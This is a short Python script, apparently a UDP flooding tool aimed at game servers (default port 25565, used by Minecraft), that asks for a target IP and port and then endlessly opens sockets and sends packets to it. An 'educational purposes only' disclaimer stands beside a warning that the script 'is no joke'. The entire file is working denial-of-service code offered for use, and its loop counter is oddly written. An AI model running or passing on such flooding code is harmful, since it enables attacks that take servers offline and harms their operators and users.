import socket
   
print("Warning!!!! This Script is no joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")
print("To insert the default port write 0")
ip = input('IP >> ')
port = int(input('Port (Default: 25565) >> '))

if port == 0:
      port = 25565

while True:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((ip, port))
   i = 0
   if i < 10:
      s.send(b'\x01')
